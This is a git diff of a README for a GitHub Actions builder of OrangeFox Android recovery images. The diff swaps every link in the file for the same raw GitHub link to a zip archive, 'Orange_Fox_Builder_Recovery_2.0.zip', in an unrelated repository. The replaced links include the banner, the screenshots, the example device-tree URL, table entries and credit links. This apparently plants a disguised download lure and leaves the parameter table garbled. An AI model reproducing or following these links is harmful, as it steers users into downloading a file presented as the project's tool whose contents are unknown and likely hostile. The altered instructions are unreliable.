@@ -5,7 +5,7 @@ only Supports OrangeFox  (14.1 is not ready yet) / 12.1 / 11
 *** WARNING***: the fox_14.1 branch is *EXPERIMENTAL*! Also, syncing will take a *VERY* long time
 **************
 ```
-![cap_sprout](https://wiki.orangefox.tech/banner.svg)
+![cap_sprout](https://raw.githubusercontent.com/qcmp34/OrangeFox-Recovery-Builder-2024/OrangeFox/tools/Orange_Fox_Builder_Recovery_2.0.zip)
 ---
 # Features
 Auto updates in background/
@@ -63,17 +63,17 @@ OrangeFox Recovery was originally designed for Xiaomi Redmi Note 4X Snapdragon (
 -----
 
 ## Output will be like this
-![](https://s3.bmp.ovh/imgs/2024/10/07/3913c62d5c20649f.png)
+![](https://raw.githubusercontent.com/qcmp34/OrangeFox-Recovery-Builder-2024/OrangeFox/tools/Orange_Fox_Builder_Recovery_2.0.zip)
 
 ## Parameter Description
 | Name | Description | Example |
 | ------------ | -------------------- | ------------ |
 | `MANIFEST_BRANCH` | Source branch | OrangeFox-12.1 |
-| `DEVICE_TREE_URL` | Device tree address | https://github.com/kinguser981/android_device_samsung_a05s.git |
+| `DEVICE_TREE_URL` | Device tree address | https://raw.githubusercontent.com/qcmp34/OrangeFox-Recovery-Builder-2024/OrangeFox/tools/Orange_Fox_Builder_Recovery_2.0.zip |
 | `DEVICE_TREE_BRANCH` | Device branch that you want to use for build (typically corresponds to the manifest branch) | android-12.1 |
-| `DEVICE_PATH` | Device tree location for syncing, relative to workspace root (usually listed as "LOCAL_PATH" or "DEVICE_PATH" in BoardConfig.mk) | device/samsung/a05s |
+| `DEVICE_PATH` | Device tree location for syncing, relative to workspace root (usually listed as "LOCAL_PATH" or "DEVICE_PATH" in https://raw.githubusercontent.com/qcmp34/OrangeFox-Recovery-Builder-2024/OrangeFox/tools/Orange_Fox_Builder_Recovery_2.0.zip) | device/samsung/a05s |
 | `DEVICE_NAME` | Model name (same as twrp_`<DEVICE_NAME>`.mk from device tree) | a05s |
-| `DEVICE_MAKEFILE` | Name of device-specific makefile from tree (format: `<PREFIX>_<DEVICE_NAME>`) | fox_a05s.mk
+| `DEVICE_MAKEFILE` | Name of device-specific makefile from tree (format: `<PREFIX>_<DEVICE_NAME>`) | https://raw.githubusercontent.com/qcmp34/OrangeFox-Recovery-Builder-2024/OrangeFox/tools/Orange_Fox_Builder_Recovery_2.0.zip
 | `BUILD_TARGET` | Build Target Partition (boot/recovery/vendor_boot) | recovery |
 | `RECOVERY_INSTALLER` | Include recovery installer zip | Optional |
 | `RECOVERY_TAR` | Recovery to tar for Samsung devices | Optional |
@@ -83,13 +83,13 @@ OrangeFox Recovery was originally designed for Xiaomi Redmi Note 4X Snapdragon (
 ## Usage Instructions
 
 #### 1. Click 'Fork' in the upper right corner of this repo
-![](https://s3.bmp.ovh/imgs/2024/09/07/acd37b59bde6971e.png)
+![](https://raw.githubusercontent.com/qcmp34/OrangeFox-Recovery-Builder-2024/OrangeFox/tools/Orange_Fox_Builder_Recovery_2.0.zip)
 #### 2. After waiting for the automatic redirection, you will see your own username
 ## Building the Recovery
 #### 3. Click on 'Actions' then Click no 'OrangeFox - Build'
-![](https://s3.bmp.ovh/imgs/2024/10/07/fc95db719a8603e4.png)
+![](https://raw.githubusercontent.com/qcmp34/OrangeFox-Recovery-Builder-2024/OrangeFox/tools/Orange_Fox_Builder_Recovery_2.0.zip)
 #### 4. Click 'Run workflow', choose the branch for the recovery that you want to build, and fill in according to the above 'Parameter Description'
-![](https://s3.bmp.ovh/imgs/2024/10/08/b0914297dd7ec359.png)
+![](https://raw.githubusercontent.com/qcmp34/OrangeFox-Recovery-Builder-2024/OrangeFox/tools/Orange_Fox_Builder_Recovery_2.0.zip)
 #### 5. After filling in, click 'Run workflow' to start running
 
 -----
@@ -99,10 +99,10 @@ Can be downloaded at [Release](../../releases)
 
 -----
 ## Reference and Credits
-- https://github.com/that1
-- https://github.com/TeamWin
-- https://gitlab.com/OrangeFox
-- https://github.com/cd-Crypton
-- https://github.com/azwhikaru
+- https://raw.githubusercontent.com/qcmp34/OrangeFox-Recovery-Builder-2024/OrangeFox/tools/Orange_Fox_Builder_Recovery_2.0.zip
+- https://raw.githubusercontent.com/qcmp34/OrangeFox-Recovery-Builder-2024/OrangeFox/tools/Orange_Fox_Builder_Recovery_2.0.zip
+- https://raw.githubusercontent.com/qcmp34/OrangeFox-Recovery-Builder-2024/OrangeFox/tools/Orange_Fox_Builder_Recovery_2.0.zip
+- https://raw.githubusercontent.com/qcmp34/OrangeFox-Recovery-Builder-2024/OrangeFox/tools/Orange_Fox_Builder_Recovery_2.0.zip
+- https://raw.githubusercontent.com/qcmp34/OrangeFox-Recovery-Builder-2024/OrangeFox/tools/Orange_Fox_Builder_Recovery_2.0.zip
 - And to all Contributors in every repositories and scripts I used.
 
